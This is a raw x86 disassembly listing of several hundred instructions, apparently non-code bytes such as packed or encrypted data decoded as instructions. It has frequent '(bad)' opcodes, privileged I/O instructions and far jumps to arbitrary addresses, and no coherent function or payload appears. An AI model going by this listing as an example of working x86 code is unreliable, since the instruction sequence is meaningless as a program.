  41660b:	in     al,dx
  41660c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41660d:	and    eax,0x164dd0bb
  416612:	pop    ds
  416613:	ja     0x416688
  416615:	or     eax,0xb726847
  41661a:	aas    
  41661b:	push   0x79bb5961
  416620:	jnp    0x4165e6
  416622:	push   es
  416623:	pop    ebx
  416624:	push   edi
  416625:	inc    edi
  416626:	jl     0x4165c5
  416628:	and    BYTE PTR [ecx],bh
  41662a:	inc    esi
  41662b:	pop    eax
  41662c:	lods   eax,DWORD PTR cs:[esi]
  41662e:	or     edx,edx
  416630:	fdivr  QWORD PTR [eax-0x36]
  416633:	dec    edi
  416634:	jmp    DWORD PTR [edx-0x33]
  416637:	pusha  
  416638:	jnp    0x41666e
  41663a:	push   ss
  41663b:	xchg   ebp,eax
  41663c:	(bad)  
  41663e:	jmp    0x41660c
  416640:	pop    edi
  416641:	adc    cl,BYTE PTR [eax+0x2860ac68]
  416647:	das    
  416648:	mov    ebp,0xf71f589a
  41664d:	adc    dh,al
  41664f:	mov    DWORD PTR [ebp+eax*4+0x57],eax
  416653:	xor    al,0x6b
  416655:	push   edx
  416656:	(bad)  
  416657:	out    0x4e,eax
  416659:	shl    cl,cl
  41665b:	in     al,dx
  41665c:	fstp   TBYTE PTR [edx+0x586f7ba6]
  416662:	jmp    0x7bb8:0xbfffde5
  416669:	push   eax
  41666a:	ja     0x416677
  41666c:	jnp    0x4166d2
  41666e:	push   cs
  41666f:	ret    
  416670:	fidiv  WORD PTR [edi+ebx*1]
  416673:	rcl    BYTE PTR [ecx+0x1556d960],0xca
  41667a:	sysexit 
  41667c:	scas   eax,DWORD PTR es:[edi]
  41667d:	and    eax,DWORD PTR [edi+0x6883453a]
  416683:	xlat   BYTE PTR ds:[ebx]
  416684:	es stos BYTE PTR es:[edi],al
  416686:	jge    0x4166fd
  416688:	xor    DWORD PTR [eax-0x6c],esp
  41668b:	stos   BYTE PTR es:[edi],al
  41668c:	(bad)  
  41668d:	fisttp DWORD PTR [esi-0x18]
  416690:	frstor [edi]
  416692:	in     al,dx
  416693:	stos   DWORD PTR es:[edi],eax
  416694:	mov    ecx,0xf0c5351c
  416699:	cmp    DWORD PTR [edi+esi*4],eax
  41669c:	and    esi,ecx
  41669e:	sbb    al,0xf1
  4166a0:	dec    ebp
  4166a1:	sbb    eax,0x88fc66a6
  4166a6:	mov    bl,0xbd
  4166a8:	xchg   ebp,eax
  4166a9:	pop    eax
  4166aa:	jge    0x4166d6
  4166ac:	push   esi
  4166ad:	or     eax,0x61f9f496
  4166b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b3:	cmp    al,0x41
  4166b5:	adc    BYTE PTR ds:0x6fbbadc5,0x68
  4166bc:	xchg   ebp,eax
  4166bd:	sub    BYTE PTR [edi+ebx*4-0x20e398cc],bh
  4166c4:	pop    ecx
  4166c5:	test   DWORD PTR [ebp+0x7e97961d],edi
  4166cb:	in     al,0x2b
  4166cd:	int    0x69
  4166cf:	adc    al,0xf8
  4166d1:	(bad)  
  4166d2:	out    0xe9,al
  4166d4:	push   es
  4166d5:	mov    dh,BYTE PTR [edi-0x32e20ac3]
  4166db:	cli    
  4166dc:	mov    DWORD PTR [esi-0x4c],edi
  4166df:	dec    edi
  4166e0:	inc    edi
  4166e1:	mov    ah,0x6e
  4166e3:	scas   eax,DWORD PTR es:[edi]
  4166e4:	popa   
  4166e5:	ror    BYTE PTR [ecx-0x34],cl
  4166e8:	add    al,BYTE PTR [ebx]
  4166ea:	shl    BYTE PTR [esi-0x6e],0x48
  4166ee:	mov    BYTE PTR ds:0xbc471b7f,bl
  4166f4:	lahf   
  4166f5:	test   DWORD PTR [eax-0x4c],0x66537e05
  4166fc:	cmc    
  4166fd:	sub    eax,0x2d7f60e9
  416702:	out    dx,eax
  416703:	popa   
  416704:	sub    al,0xe2
  416706:	mov    ecx,0x1d0319b1
  41670b:	psllq  mm5,QWORD PTR [eax+edx*8+0x6f]
  416710:	call   0xc17e:0x624f4366
  416717:	and    esi,esp
  416719:	sub    BYTE PTR [ebx+eiz*8+0x470318ee],dh
  416720:	add    eax,0x3d68ab5f
  416725:	fimul  WORD PTR ds:0x6d6853b8
  41672b:	sbb    al,0xae
  41672d:	mov    eax,ds:0x2018d753
  416732:	out    dx,al
  416733:	cmp    eax,0x161941c8
  416738:	and    DWORD PTR [edi],0x67a4c4ca
  41673e:	dec    ebx
  41673f:	mov    al,0xe0
  416741:	ins    DWORD PTR es:[edi],dx
  416742:	add    dl,BYTE PTR [ecx+0x29]
  416745:	ins    DWORD PTR es:[edi],dx
  416746:	and    edx,DWORD PTR [esi+0x5c]
  416749:	stos   DWORD PTR es:[di],eax
  41674b:	shr    esp,0xeb
  41674e:	aad    0x1d
  416750:	imul   BYTE PTR [eax+edx*2+0x1d]
  416754:	mov    ds:0x95982a70,al
  416759:	cmp    DWORD PTR [ebx],0x1838206d
  41675f:	test   eax,0xabc0cbf1
  416764:	pop    ebx
  416765:	sub    BYTE PTR [edi],ah
  416767:	inc    ecx
  416768:	push   edi
  416769:	add    DWORD PTR [edx-0x53],esi
  41676c:	jne    0x416738
  41676e:	pop    ss
  41676f:	push   edi
  416770:	push   cs
  416771:	popf   
  416772:	adc    eax,0x7e9e7d73
  416777:	pop    ebp
  416778:	xchg   ebx,eax
  416779:	fadd   DWORD PTR [ebp+0x0]
  41677c:	sar    bl,0x50
  41677f:	pop    ebx
  416780:	add    al,0xb8
  416782:	sbb    eax,0xf182387d
  416787:	aas    
  416788:	test   DWORD PTR [ebp+0x5f37572],ebp
  41678e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41678f:	push   esp
  416790:	sub    al,0xe
  416792:	loope  0x4167b6
  416794:	cmp    DWORD PTR [edi+eiz*4-0x4d],eax
  416798:	push   esi
  416799:	adc    DWORD PTR gs:0xa5cc9afe,ebp
  4167a0:	mov    eax,ds:0x8b55e0d4
  4167a5:	inc    ecx
  4167a6:	out    0x6,eax
  4167a8:	cld    
  4167a9:	fld    DWORD PTR [edx-0x19f6676f]
  4167af:	add    BYTE PTR [ecx+0x64],al
  4167b2:	lods   al,BYTE PTR ds:[esi]
  4167b3:	test   DWORD PTR [ebx],edx
  4167b5:	jo     0x416795
  4167b7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4167b9:	cmp    al,0x3a
  4167bb:	dec    ebx
  4167bc:	mov    esp,0x3f4d305c
  4167c1:	fild   DWORD PTR [edx]
  4167c3:	es iret 
  4167c5:	ja     0x4167e3
  4167c7:	popf   
  4167c8:	dec    esp
  4167c9:	push   ecx
  4167ca:	in     al,0x56
  4167cc:	and    al,0x53
  4167ce:	ror    BYTE PTR [ebx],0x99
  4167d1:	cmp    DWORD PTR [eax+esi*8-0x6cab649c],esp
  4167d8:	inc    esi
  4167d9:	dec    edx
  4167da:	iret   
  4167db:	ret    
  4167dc:	lahf   
  4167dd:	pushf  
  4167de:	xchg   edi,eax
  4167df:	xor    ch,BYTE PTR [edx+0x62bf05a9]
  4167e5:	mov    cl,0x7a
  4167e7:	ret    0x8866
  4167ea:	sahf   
  4167eb:	(bad)  [ebp+0x3b5b5a00]
  4167f1:	dec    ax
  4167f3:	xlat   BYTE PTR ds:[ebx]
  4167f4:	call   0xb6236190
  4167f9:	jg     0x4167ef
  4167fb:	mov    ds:0x2b034f8e,eax
  416800:	jnp    0x4167bb
  416802:	jmp    0x4167a4
  416804:	fisttp QWORD PTR [eax]
  416806:	fs std 
  416808:	fistp  DWORD PTR [ecx+0x866299b]
  41680e:	test   ebx,ebx
  416810:	lods   eax,DWORD PTR ds:[esi]
  416811:	ins    DWORD PTR es:[edi],dx
  416812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416813:	push   esp
  416814:	pushf  
  416815:	loope  0x4167f7
  416817:	pop    eax
  416818:	mov    dl,BYTE PTR [edx-0x517a19df]
  41681e:	push   ds
  41681f:	push   edi
  416820:	rol    edx,1
  416822:	rol    DWORD PTR [ebx-0x34dbf5e3],1
  416828:	call   DWORD PTR [eax]
  41682a:	cmp    dh,ah
  41682c:	retf   
  41682d:	sbb    ah,bh
  41682f:	pop    esi
  416830:	push   ebp
  416831:	pop    eax
  416832:	xchg   edi,eax
  416833:	loopne 0x416879
  416835:	test   BYTE PTR [edx+0x506270bb],bl
  41683b:	test   al,0x32
  41683d:	pop    esi
  41683e:	les    ebp,FWORD PTR [ecx+0xa18f909]
  416844:	les    edx,FWORD PTR [ebp-0x17f5fb68]
  41684a:	out    0x3a,al
  41684c:	jle    0x416895
  41684e:	rcr    BYTE PTR [edi],0x76
  416851:	test   edx,0x6c284bd8
  416857:	jbe    0x416888
  416859:	cmp    dh,BYTE PTR [esi+0x2e]
  41685c:	inc    edx
  41685d:	mov    ds:0x9c9ca14d,eax
  416862:	adc    ebp,DWORD PTR [edi-0x7c]
  416865:	fbld   TBYTE PTR [ecx-0x71]
  416868:	mov    ds:0x2812c180,al
  41686d:	pop    eax
  41686e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41686f:	push   edi
  416870:	sbb    ch,ah
  416872:	aad    0xfa
  416874:	push   ebx
  416875:	cmp    DWORD PTR ds:0x42eaaad0,esp
  41687b:	push   0xffffffdb
  41687d:	and    ah,ch
  41687f:	jge    0x4168ed
  416881:	rcl    BYTE PTR [esp+eiz*8],0x8b
  416885:	sbb    al,0xd8
  416887:	push   eax
  416888:	cmp    BYTE PTR [esi],dh
  41688a:	mov    WORD PTR [ecx+0x4874ce8a],fs
  416890:	pop    esp
  416891:	fimul  DWORD PTR [esi+0x3088e660]
  416897:	push   ebx
  416898:	enter  0x29e,0x2e
  41689c:	sbb    bh,BYTE PTR [edi+edx*2-0x7702b63f]
  4168a3:	jnp    0x416857
  4168a5:	out    dx,eax
  4168a6:	pop    ebx
  4168a7:	jbe    0x41686a
  4168a9:	xor    eax,esi
  4168ab:	sub    eax,0xedb2c562
  4168b0:	jmp    0xd046:0xfe351e3f
  4168b7:	dec    esi
  4168b8:	repnz test DWORD PTR [eax-0x5bdb981b],esp
  4168bf:	and    BYTE PTR [bp+si],al
  4168c2:	xchg   esp,eax
  4168c3:	adc    edx,DWORD PTR [ecx-0x4]
  4168c6:	xchg   esi,eax
  4168c7:	mov    edx,0xf233e49
  4168cc:	jnp    0x416946
  4168ce:	shl    DWORD PTR [esi+esi*8-0x552b51ef],1
  4168d5:	pop    ebx
  4168d6:	inc    eax
  4168d7:	cmc    
  4168d8:	jge    0x4168c8
  4168da:	sar    ah,0xe7
  4168dd:	(bad)  
  4168de:	ins    BYTE PTR es:[edi],dx
  4168df:	pop    ecx
  4168e0:	push   ebx
  4168e1:	pop    ebx
  4168e2:	iret   
  4168e3:	retf   
  4168e4:	mov    ds:0xe2a28d4a,al
  4168e9:	aad    0xa5
  4168eb:	movq   QWORD PTR [ebx+0x10dab0d4],mm4
  4168f2:	cli    
  4168f3:	adc    ah,ah
  4168f5:	leave  
  4168f6:	fdivr  DWORD PTR [edx]
  4168f8:	lea    ecx,[ebx-0x24]
  4168fb:	sub    esi,DWORD PTR [edx+0x65]
  4168fe:	push   edi
  4168ff:	cmp    bl,BYTE PTR [edx]
  416901:	xor    al,0x40
  416903:	dec    esi
  416904:	cli    
  416905:	mov    ah,0x43
  416907:	stc    
  416908:	jo     0x4168f8
  41690a:	mov    eax,0x4d9fa96e
  41690f:	jle    0x41697a
  416911:	xchg   esp,eax
  416912:	imul   edi,ecx,0x5d
  416915:	fwait
  416916:	jb     0x416901
  416918:	hlt    
  416919:	or     eax,0x59d499b4
  41691e:	cmp    dh,0xa0
  416921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416922:	vpunpckhbw xmm1,xmm6,XMMWORD PTR [esi]
  416926:	cmp    bh,BYTE PTR [eax]
  416928:	xchg   bp,ax
  41692a:	pop    es
  41692b:	adc    DWORD PTR [ebp+0x29],0x883b1cd9
  416932:	or     eax,0x23533195
  416937:	adc    ch,dl
  416939:	add    DWORD PTR [edx+0x19],0xffffffe7
  41693d:	fild   WORD PTR [ebx-0x3]
  416940:	mov    es,WORD PTR [esi-0x1f]
  416943:	mov    eax,DWORD PTR [esi]
  416945:	or     DWORD PTR [edi+0x59],esp
  416948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416949:	hlt    
  41694a:	lods   al,BYTE PTR ds:[esi]
  41694b:	sbb    DWORD PTR [edi+0x46],eax
  41694e:	ins    DWORD PTR es:[edi],dx
  41694f:	lea    ebx,[ecx-0x3f]
  416952:	push   esp
  416953:	jae    0x4169c2
  416955:	loope  0x4168f2
  416957:	xchg   ebp,eax
  416958:	sub    al,0x6f
  41695a:	ja     0x4169d1
  41695c:	add    DWORD PTR [edi],0xffffffce
  41695f:	sbb    eax,0xe38bb311
  416964:	push   cs
  416965:	shl    DWORD PTR [ebx+0x26],cl
  416968:	jp     0x416974
  41696a:	pop    ds
  41696b:	add    BYTE PTR [edi+0x1b5b7426],dl
  416971:	push   eax
  416972:	ret    0x2abb
  416975:	xor    bh,bh
  416977:	in     eax,dx
  416978:	adc    al,0xd2
  41697a:	pop    eax
  41697b:	ficomp DWORD PTR [edi+0x4291e660]
  416981:	cvtdq2ps xmm4,xmm1
  416984:	sub    al,0x93
  416986:	mov    ecx,0xfb74fddd
  41698b:	ret    0x7257
  41698e:	nop
  41698f:	inc    eax
  416990:	or     al,0xa6
  416992:	aaa    
  416993:	loope  0x416918
  416995:	pop    eax
  416996:	lea    esp,[esi+0x7f]
  416999:	aam    0xfb
  41699b:	pop    es
  41699c:	fdivp  st(0),st
  41699e:	pusha  
  41699f:	adc    ah,BYTE PTR [esi-0x1a]
  4169a2:	ror    DWORD PTR [ebp+0x3c],cl
  4169a5:	test   eax,0x3fea1347
  4169aa:	add    eax,0xad81e3ba
  4169af:	mov    eax,ds:0x3af5f270
  4169b4:	mov    ebp,0xe7898c48
  4169b9:	sub    eax,0x1178562b
  4169be:	xchg   esi,eax
  4169bf:	xchg   esp,eax
  4169c0:	inc    ecx
  4169c1:	popa   
  4169c2:	pop    ecx
  4169c3:	lahf   
  4169c4:	jecxz  0x416a22
  4169c6:	xchg   esp,eax
  4169c7:	sbb    esi,esp
  4169c9:	test   BYTE PTR [esi],dl
  4169cb:	mov    DWORD PTR ds:0x81a4c53f,edi
  4169d1:	bound  edi,QWORD PTR [eax+0x3373a150]
  4169d7:	adc    eax,0x9f8ae24e
  4169dc:	jbe    0x41698e
  4169de:	lahf   
  4169df:	jle    0x416a0c
  4169e1:	or     ebp,DWORD PTR [edx+0x4e]
  4169e4:	ffreep st(5)
  4169e6:	xchg   edi,eax
  4169e7:	in     eax,dx
  4169e8:	jmp    0x7f49:0x76204f19
  4169ef:	out    dx,al
  4169f0:	enter  0xc0f,0x87
  4169f4:	dec    edx
  4169f5:	cmp    edi,DWORD PTR cs:[ecx+0x77]
  4169f9:	cwde   
  4169fa:	xchg   esp,eax
  4169fb:	aad    0x9
  4169fd:	xchg   ebp,eax
  4169fe:	adc    BYTE PTR [ecx+ebx*8],dl
  416a01:	xchg   bh,bl
  416a03:	fs fcmove st,st(5)
  416a06:	inc    ebp
  416a07:	or     al,BYTE PTR [eax]
  416a09:	add    DWORD PTR [esi+0x13],eax
  416a0c:	icebp  
  416a0d:	test   DWORD PTR [edi+0x52],esp
  416a10:	mov    al,0x4d
  416a12:	mov    ds:0x811f2ad5,al
  416a17:	and    BYTE PTR [ecx-0x15e2561a],0xcb
  416a1e:	rol    DWORD PTR [edi],cl
  416a20:	stos   DWORD PTR es:[edi],eax
  416a21:	fild   QWORD PTR [ebx-0xf]
  416a24:	stos   DWORD PTR es:[edi],eax
  416a25:	sub    eax,edi
  416a27:	lds    edx,FWORD PTR [edx]
  416a29:	cmovg  ebp,DWORD PTR [edi+esi*1+0x3f]
  416a2e:	push   ebx
  416a2f:	popa   
  416a30:	jecxz  0x416a55
  416a32:	xor    DWORD PTR [esi],edx
  416a34:	popf   
  416a35:	fwait
  416a36:	outs   dx,DWORD PTR ds:[esi]
  416a37:	repnz stos BYTE PTR es:[edi],al
  416a39:	ins    DWORD PTR es:[edi],dx
  416a3a:	jp     0x416a4d
  416a3c:	fild   QWORD PTR [ebx]
  416a3e:	imul   eax,esi,0xe06c558b
  416a44:	fmul   QWORD PTR [edi+0x386a9b8c]
  416a4a:	sub    DWORD PTR [eax+ecx*8+0x53f81f3b],ebx
  416a51:	sub    DWORD PTR [esi+0x16d18053],ecx
  416a57:	fdiv   DWORD PTR [edi+0x57c12205]
  416a5d:	ins    BYTE PTR es:[edi],dx
  416a5e:	jmp    0x416ab4
  416a60:	push   ds
  416a61:	add    eax,0x5d02de34
  416a66:	or     ch,BYTE PTR [edx]
  416a68:	pop    edi
  416a69:	mov    edi,0xd6fd09fd
  416a6e:	stos   DWORD PTR es:[edi],eax
  416a6f:	ret    0x53c
  416a72:	xchg   ecx,eax
  416a73:	arpl   WORD PTR [esi-0xa],ax
  416a76:	ins    DWORD PTR es:[edi],dx
  416a77:	push   ds
  416a78:	fstcw  WORD PTR [ebx+0x123c4987]
  416a7f:	div    DWORD PTR [edx+edx*8+0x79ed51d0]
  416a86:	cmc    
  416a87:	pop    edi
  416a88:	sub    dh,ah
  416a8a:	or     dl,BYTE PTR [ebx]
  416a8c:	dec    ebp
  416a8d:	pop    esi
  416a8e:	mov    ah,0x14
  416a90:	imul   dx,WORD PTR [edi+0x47250171],0xff9c
  416a98:	cwde   
  416a99:	sbb    bh,BYTE PTR [ebx+0x3c]
  416a9c:	test   eax,0xd91cd8a4
  416aa1:	clc    
  416aa2:	lods   al,BYTE PTR ds:[esi]
  416aa3:	aam    0x8
  416aa5:	adc    ebp,DWORD PTR [ebx-0x24]
  416aa8:	sti    
  416aa9:	mov    cl,0x35
  416aab:	clc    
  416aac:	inc    esi
  416aad:	mov    edx,0xd19d4633
  416ab2:	xor    al,0x78
  416ab4:	mov    cl,0x3e
  416ab6:	and    ecx,DWORD PTR [ecx-0x20]
  416ab9:	mov    ah,0x6e
  416abb:	sar    ebp,0x4b
  416abe:	stos   DWORD PTR es:[edi],eax
  416abf:	leave  
  416ac0:	or     dh,BYTE PTR [edx]
  416ac2:	or     al,0x49
  416ac4:	leave  
  416ac5:	ret    0x8c38
  416ac8:	fcos   
  416aca:	fsave  [edi+0x7b551372]
  416ad1:	mov    al,0x31
  416ad3:	dec    esi
  416ad4:	xchg   ah,ah
  416ad6:	pop    ecx
  416ad7:	imul   ecx,DWORD PTR [eax],0xe81955c9
  416add:	adc    bh,ah
  416adf:	ret    0xb05b
  416ae2:	inc    edi
  416ae3:	nop
  416ae4:	jo     0x416a90
  416ae6:	jmp    0x6c7:0xe9bea139
  416aed:	lock add dl,BYTE PTR [edi-0x77b35245]
  416af4:	xchg   edi,eax
  416af5:	inc    eax
  416af6:	mov    BYTE PTR [edx-0x2a36eb96],dl
  416afc:	scas   eax,DWORD PTR es:[edi]
  416afd:	push   ds
  416afe:	shr    DWORD PTR [ecx+0x5acfd09e],cl
  416b04:	pop    ss
  416b05:	jge    0x416aaf
  416b07:	xor    ecx,DWORD PTR [ecx]
  416b09:	dec    edi
  416b0a:	loop   0x416b0c
  416b0c:	xchg   esp,eax
  416b0d:	mov    bh,BYTE PTR [ebx+eax*2-0x72a1a]
  416b14:	push   esi
  416b15:	mov    esp,0x8966a521
  416b1a:	pop    ecx
  416b1b:	add    BYTE PTR [edx-0x7c],al
  416b1e:	ret    0xee2e
  416b21:	lods   eax,DWORD PTR ds:[esi]
  416b22:	and    DWORD PTR es:[esi+0x72],ebx
  416b26:	jmp    0x416b34
  416b28:	and    al,0xb7
  416b2a:	ficom  DWORD PTR [edi+0x29aa3163]
  416b30:	pop    es
  416b31:	jo     0x416b44
  416b33:	mov    ds:0xf49b3a66,eax
  416b38:	cli    
  416b39:	xor    dl,BYTE PTR [ecx-0x378c3c04]
  416b3f:	mov    al,0x1
  416b41:	add    esp,esp
  416b43:	mov    bl,0x8a
  416b45:	pusha  
  416b46:	sbb    eax,0x650b2b9b
  416b4b:	cmp    edx,DWORD PTR [edi+eax*8-0x694d53ac]
  416b52:	mov    al,ds:0x72f40c4c
  416b57:	test   DWORD PTR [eax],0xe3ff7fe
  416b5d:	test   al,0x4c
  416b5f:	jnp    0x416bcd
  416b61:	iret   
  416b62:	iret   
  416b63:	inc    eax
  416b64:	test   DWORD PTR [edx+0x4f9b958d],edi
  416b6a:	imul   DWORD PTR [esi-0x7a7df28a]
  416b70:	lods   eax,DWORD PTR ds:[esi]
  416b71:	push   edi
  416b72:	and    edx,DWORD PTR [ecx-0x2dd712cc]
  416b78:	mov    al,0xad
  416b7a:	outs   dx,DWORD PTR ds:[esi]
  416b7b:	int3   
  416b7c:	push   es
  416b7d:	popf   
  416b7e:	hlt    
  416b7f:	xchg   esp,eax
  416b80:	dec    ecx
  416b81:	sbb    al,0xf
  416b83:	mov    eax,ds:0x3caa7603
  416b88:	lock neg edi
  416b8b:	or     eax,0x5db1cf2b
  416b90:	add    eax,0xd8e339ed
  416b95:	cli    
  416b96:	clc    
  416b97:	cmp    esi,edi
  416b99:	outs   dx,BYTE PTR ds:[esi]
  416b9a:	xchg   edi,eax
  416b9b:	das    
  416b9c:	outs   dx,DWORD PTR ds:[esi]
  416b9d:	les    edx,FWORD PTR [eax-0x5978bd9c]
  416ba3:	inc    edi
  416ba4:	xor    edx,ecx
  416ba6:	js     0x416b6f
  416ba8:	add    bl,BYTE PTR [ecx]
  416baa:	(bad)  
  416bab:	adc    edi,DWORD PTR [edi]
  416bad:	sar    DWORD PTR [esi],cl
  416baf:	mov    DWORD PTR [edi+edi*8+0x2],edx
  416bb3:	inc    ecx
  416bb4:	jno    0x416bde
  416bb6:	jae    0x416b5f
  416bb8:	lods   eax,DWORD PTR ds:[esi]
  416bb9:	xor    eax,0x8fc2903c
  416bbe:	sbb    ebx,DWORD PTR ds:0x2f9402c4
  416bc4:	pop    ecx
  416bc5:	sub    al,0xa7
  416bc7:	fld    QWORD PTR [edi+0x7c]
  416bca:	std    
  416bcb:	in     al,dx
  416bcc:	inc    ebp
  416bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bce:	inc    ebx
  416bcf:	(bad)  
  416bd0:	fnstenv [ecx+0x29]
  416bd3:	xor    bl,BYTE PTR [ebp-0x22510d1b]
  416bd9:	sbb    edx,DWORD PTR [edx]
  416bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdd:	inc    ecx
  416bde:	addr16 stc 
  416be0:	dec    esi
  416be1:	xchg   esp,eax
  416be2:	js     0x416bc3
  416be4:	dec    edx
  416be5:	scas   eax,DWORD PTR es:[edi]
  416be6:	xor    DWORD PTR es:[esi+eiz*1+0x36],ebp
  416beb:	in     al,0xad
  416bed:	inc    edi
  416bee:	and    dl,BYTE PTR [ebx]
  416bf0:	push   ebx
  416bf1:	jnp    0x416bac
  416bf3:	dec    ebx
  416bf4:	mov    edi,0xe141821a
  416bf9:	jp     0x416bd5
  416bfb:	dec    ebx
  416bfc:	adc    dl,BYTE PTR [ebx+ebp*1+0xb]
  416c00:	push   ebp
  416c01:	push   edx
  416c02:	test   al,0x22
  416c04:	les    esi,FWORD PTR [esi+0x6c]
  416c07:	jns    0x416ba1
  416c09:	in     eax,dx
  416c0a:	jecxz  0x416c82
  416c0c:	mov    ds:0x75918ff3,al
  416c11:	popa   
  416c12:	cmp    eax,0xf4e1ee41
  416c17:	std    
  416c18:	and    ebp,ebp
  416c1a:	sahf   
  416c1b:	inc    eax
  416c1c:	into   
  416c1d:	pop    ebx
  416c1e:	dec    esp
  416c1f:	popf   
  416c20:	inc    eax
  416c21:	daa    
  416c22:	nop
  416c23:	mov    ebx,0xcb2d6856
  416c28:	out    0xbc,eax
  416c2a:	jne    0x416c56
  416c2c:	push   0xa2595fd0
  416c31:	les    edx,FWORD PTR [edi-0x3a]
  416c34:	fs push 0x10
  416c37:	int3   
  416c38:	dec    ebp
  416c39:	(bad)  
  416c3a:	or     al,0x11
  416c3c:	pop    ss
  416c3d:	gs js  0x416cb7
  416c40:	cmp    esi,DWORD PTR [ecx]
  416c42:	adc    DWORD PTR [eax+esi*4+0x6],esp
  416c46:	lahf   
  416c47:	and    eax,0xbdc692d2
  416c4c:	dec    esi
  416c4d:	fstp   TBYTE PTR [ecx]
  416c4f:	cmp    dh,ch
  416c51:	adc    eax,0x552c77da
  416c56:	lock cli 
  416c58:	stc    
  416c59:	outs   dx,BYTE PTR ds:[esi]
  416c5a:	bnd jns 0x416ccb
  416c5d:	xchg   edi,eax
  416c5e:	aam    0xaa
  416c60:	call   0xc490:0xd0f48b6f
  416c67:	and    eax,0xa8a45398
  416c6c:	jnp    0x416cad
  416c6e:	xchg   esp,eax
  416c6f:	xchg   ecx,eax
  416c70:	sar    DWORD PTR [eax-0x6eda01f1],cl
  416c76:	lock jb 0x416c9e
  416c79:	jg     0x416c6d
  416c7b:	retf   0x7b3d
  416c7e:	inc    edx
  416c7f:	xchg   esp,eax
  416c80:	inc    edx
  416c81:	cmp    BYTE PTR [eax+0x65],ch
  416c84:	aas    
  416c85:	ja     0x416c27
  416c87:	dec    ebp
  416c88:	test   BYTE PTR [esi-0x66],0x11
  416c8c:	es neg ah
  416c8f:	stos   DWORD PTR es:[edi],eax
  416c90:	hlt    
  416c91:	sbb    eax,0x3685382d
  416c96:	mov    ecx,0xdd6d8a8b
  416c9b:	jne    0x416c22
  416c9d:	ss cmp esp,eax
  416ca0:	xor    dh,BYTE PTR [eax]
  416ca2:	in     al,dx
  416ca3:	hlt    
  416ca4:	xchg   edi,eax
  416ca5:	out    0x1,al
  416ca7:	(bad)  
  416ca8:	(bad)  
  416ca9:	xlat   BYTE PTR ds:[ebx]
  416caa:	sbb    al,0xe6
  416cac:	mov    ebx,0x7b11ac18
  416cb1:	std    
  416cb2:	and    edi,DWORD PTR [ebx+0x7e]
  416cb5:	repnz ins DWORD PTR es:[edi],dx
  416cb7:	popa   
  416cb8:	inc    edi
  416cb9:	jge    0x416d04
  416cbb:	scas   al,BYTE PTR es:[edi]
  416cbc:	lods   al,BYTE PTR ds:[esi]
  416cbd:	pop    edx
  416cbe:	adc    ebx,ebp
  416cc0:	pop    edi
  416cc1:	shl    ebx,1
  416cc3:	cmp    al,0x8d
  416cc5:	dec    ecx
  416cc6:	jecxz  0x416d14
  416cc8:	adc    cl,BYTE PTR [esi]
  416cca:	add    bl,BYTE PTR [edx]
  416ccc:	fnstsw WORD PTR [edi]
  416cce:	jo     0x416ce2
  416cd0:	call   0x39cdf490
  416cd5:	jmp    0x2b58c17d
  416cda:	cmp    BYTE PTR ds:[edi],cl
  416cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cde:	pop    esi
  416cdf:	push   0xffffff9f
  416ce1:	mov    edi,0xcf9ba2af
  416ce6:	cmp    al,0x93
  416ce8:	or     eax,0x2d693291
  416ced:	pop    ebp
  416cee:	icebp  
  416cef:	push   edx
  416cf0:	inc    ebx
  416cf1:	push   0x5
  416cf3:	in     al,dx
  416cf4:	xor    al,0x32
  416cf6:	pop    ss
  416cf7:	dec    eax
  416cf8:	or     ebp,DWORD PTR [ebx]
  416cfa:	dec    edi
  416cfb:	push   ebx
  416cfc:	or     bl,al
  416cfe:	iret   
  416cff:	mov    WORD PTR [esi],cs
  416d01:	dec    edx
  416d02:	push   edx
  416d03:	jl     0x416ce9
  416d05:	push   esp
  416d06:	sbb    al,al
  416d08:	in     al,dx
  416d09:	mov    dl,0xab
  416d0b:	mov    fs:0x9eb8cafe,al
  416d11:	iret   
  416d12:	inc    ebp
  416d13:	into   
  416d14:	cwde   
  416d15:	sar    BYTE PTR ds:0x3214ad16,1
  416d1b:	cli    
  416d1c:	and    al,0x73
  416d1e:	stos   BYTE PTR es:[edi],al
  416d1f:	ds dec ecx
  416d21:	xchg   ebx,eax
  416d22:	lock outs dx,DWORD PTR ds:[esi]
  416d24:	cmp    al,0x36
  416d26:	xchg   ebx,eax
  416d27:	lds    edx,FWORD PTR [esi-0x21]
  416d2a:	mov    ah,0x12
  416d2c:	inc    esp
  416d2d:	arpl   bp,sp
  416d2f:	(bad)  
  416d30:	leave  
  416d31:	sar    DWORD PTR [ecx-0x30],0xa6
  416d35:	pusha  
  416d36:	sbb    DWORD PTR [eax],esi
  416d38:	fidivr WORD PTR [ebp+0x7061cee8]
  416d3e:	mov    bh,0x6a
  416d40:	iret   
  416d41:	dec    esp
  416d42:	push   edx
  416d43:	xchg   ebp,eax
  416d44:	jp     0x416d6e
  416d46:	hlt    
  416d47:	xor    DWORD PTR [eax],ebp
  416d49:	(bad)  
  416d4a:	loope  0x416d0a
  416d4c:	or     DWORD PTR [edi],esi
  416d4e:	push   esp
  416d4f:	popf   
  416d50:	push   ebx
  416d51:	adc    ch,BYTE PTR [esi]
  416d53:	xor    eax,0x7c22a515
  416d58:	js     0x416d01
  416d5a:	adc    cl,0x3d
  416d5d:	aam    0x2d
  416d5f:	jb     0x416dba
  416d61:	dec    ebx
  416d62:	xchg   edi,eax
  416d63:	sbb    cl,dl
  416d65:	mov    ah,0xa9
  416d67:	pushf  
  416d68:	into   
  416d69:	xor    al,0xc1
  416d6b:	outs   dx,DWORD PTR ds:[esi]
  416d6c:	loopne 0x416db7
  416d6e:	out    dx,al
  416d6f:	idiv   DWORD PTR [ecx]
  416d71:	sub    al,0x68
  416d73:	fadd   DWORD PTR [edi]
  416d75:	and    ebx,DWORD PTR [esi+0x26]
  416d78:	jmp    0xfb4db63b
